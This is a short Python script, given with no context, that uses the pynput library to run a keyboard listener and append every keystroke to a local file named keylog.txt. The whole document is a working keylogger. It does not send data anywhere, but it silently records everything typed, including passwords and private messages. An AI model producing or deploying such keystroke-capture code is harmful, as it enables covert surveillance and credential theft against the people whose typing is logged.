import pynput

def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(f"{key}\n")

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
